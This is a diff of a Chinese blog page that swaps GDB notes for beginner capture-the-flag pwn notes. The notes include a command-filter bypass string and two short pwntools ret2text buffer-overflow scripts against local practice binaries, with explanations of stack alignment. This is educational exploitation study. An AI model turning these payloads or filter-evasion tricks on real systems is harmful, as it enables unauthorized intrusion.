@@ -19,21 +19,27 @@
   <meta name="author" content="Nefelibata">
   <meta name="keywords" content="">
   
-    <meta name="description" content="GDB运行1run  start  步入 步过 步出 步止  断点 设置 删除 显示  查看&#x2F;设置 内存，寄存器，各种参数 远程调试 寄存器 查看 1i r  rip             存放当前指令的地址 rbp，rsp  作栈（栈底，栈顶） rax            用来存储程序的返回值">
+    <meta name="description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag Ret2textx32位最简单：有system有binsh 后门函数的地址到传参的地址 123456from pwn import *p &#x3D; process(&quot;.&#x2F;ret2text&quot;)sy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn打题之基础巩固（调试）">
-<meta property="og:url" content="http://example.com/2024/12/08/pwn%E6%89%93%E9%A2%98%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%B7%A9%E5%9B%BA%EF%BC%88%E8%B0%83%E8%AF%95%EF%BC%89/index.html">
+<meta property="og:title" content="pwn学习之路">
+<meta property="og:url" content="http://example.com/2024/12/17/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
 <meta property="og:site_name" content="星期六不上发条">
-<meta property="og:description" content="GDB运行1run  start  步入 步过 步出 步止  断点 设置 删除 显示  查看&#x2F;设置 内存，寄存器，各种参数 远程调试 寄存器 查看 1i r  rip             存放当前指令的地址 rbp，rsp  作栈（栈底，栈顶） rax            用来存储程序的返回值">
+<meta property="og:description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag Ret2textx32位最简单：有system有binsh 后门函数的地址到传参的地址 123456from pwn import *p &#x3D; process(&quot;.&#x2F;ret2text&quot;)sy">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-12-08T11:57:48.000Z">
-<meta property="article:modified_time" content="2024-12-08T13:06:02.117Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172125376.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172203436.png">
+<meta property="article:published_time" content="2024-12-17T11:01:32.000Z">
+<meta property="article:modified_time" content="2024-12-17T14:04:25.883Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png">
   
   
   
-  <title>pwn打题之基础巩固（调试） - 星期六不上发条</title>
+  <title>pwn学习之路 - 星期六不上发条</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn打题之基础巩固（调试）"></span>
+            <span id="subtitle" data-typed-text="pwn学习之路"></span>
           
         </div>
 
@@ -210,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-12-08 19:57" pubdate>
-          2024年12月8日 晚上
+        <time datetime="2024-12-17 19:01" pubdate>
+          2024年12月17日 晚上
         </time>
       </span>
     
@@ -222,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          70 字
+          250 字
         
       </span>
     
@@ -233,7 +239,7 @@
         
         
         
-          1 分钟
+          3 分钟
         
       </span>
     
@@ -270,39 +276,38 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">pwn打题之基础巩固（调试）</h1>
+            <h1 id="seo-header">pwn学习之路</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+                <p>NSS-pwn 第一题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入su</p>
+<p>进入root模式；(管理员模式)</p>
+<p>binsh    &#x2F;bin&#x2F;sh    sh</p>
+<p>bash</p>
+<p>&#x2F;</p>
+<p>c’at’$IFS$9flag</p>
+<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><h3 id="x32位"><a href="#x32位" class="headerlink" title="x32位"></a>x32位</h3><p>最简单：有system有binsh</p>
+<p>后门函数的地址到传参的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>system = <span class="hljs-number">0x008048506</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<p><code>start</code></p>
-<ol>
-<li><h5 id="步入"><a href="#步入" class="headerlink" title="步入"></a>步入</h5></li>
-<li><h5 id="步过"><a href="#步过" class="headerlink" title="步过"></a>步过</h5></li>
-<li><h5 id="步出"><a href="#步出" class="headerlink" title="步出"></a>步出</h5></li>
-<li><h5 id="步止"><a href="#步止" class="headerlink" title="步止"></a>步止</h5></li>
-</ol>
-<h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><ul>
-<li>设置</li>
-<li>删除</li>
-<li>显示</li>
-</ul>
-<p>查看&#x2F;设置</p>
-<p>内存，寄存器，各种参数</p>
-<p>远程调试</p>
-<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><ul>
-<li><p>查看</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">i r<br></code></pre></td></tr></table></figure>
 
-<p><strong>rip             存放当前指令的地址</strong></p>
-<p>rbp，rsp  作栈（栈底，栈顶）</p>
-<p>rax            用来存储程序的返回值</p>
-</li>
-<li></li>
-<li></li>
-</ul>
+
+<h3 id="x64位"><a href="#x64位" class="headerlink" title="x64位"></a>x64位</h3><p>（注意栈平衡）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172125376.png" srcset="/img/loading.gif" lazyload alt="image-20241217212559335"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2textx64&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b*0x00000000004011A2&#x27;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>（32位没有，64位有）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png" srcset="/img/loading.gif" lazyload alt="image-20241217215337601"></p>
+<h5 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h5><p>64位架构中，系统要求函数调用前堆栈必须16字节对齐。因为64位函数在执行时要求堆栈在特定的对齐条件下。</p>
+<h5 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h5><p>保证payload要求是16的倍数（p64是将其转换成8字节）</p>
+<h5 id="p64是什么意思"><a href="#p64是什么意思" class="headerlink" title="p64是什么意思"></a>p64是什么意思</h5><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png" srcset="/img/loading.gif" lazyload alt="image-20241217215212527"></p>
+<h5 id="字节-字符-字节串"><a href="#字节-字符-字节串" class="headerlink" title="字节&amp;字符&amp;字节串"></a>字节&amp;字符&amp;字节串</h5><h6 id="字节Byte"><a href="#字节Byte" class="headerlink" title="字节Byte"></a>字节Byte</h6><p>数据在内存&#x2F;程序中以字节的形式储存。</p>
+<p>1个字节有由8个bit组成</p>
+<p>‘A’占一个字节，其二进制表示为 <code>01000001</code></p>
+<h6 id="字符Character"><a href="#字符Character" class="headerlink" title="字符Character"></a>字符Character</h6><h6 id="字节串Bytes"><a href="#字节串Bytes" class="headerlink" title="字节串Bytes"></a>字节串Bytes</h6><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172203436.png" srcset="/img/loading.gif" lazyload alt="image-20241217220312338"></p>
 
                 
               </div>
@@ -320,8 +325,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn打题之基础巩固（调试）</div>
-      <div>http://example.com/2024/12/08/pwn打题之基础巩固（调试）/</div>
+      <div>pwn学习之路</div>
+      <div>http://example.com/2024/12/17/pwn学习之路/</div>
     </div>
     <div class="license-meta">
       
@@ -333,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年12月8日</div>
+          <div>2024年12月17日</div>
         </div>
       
       
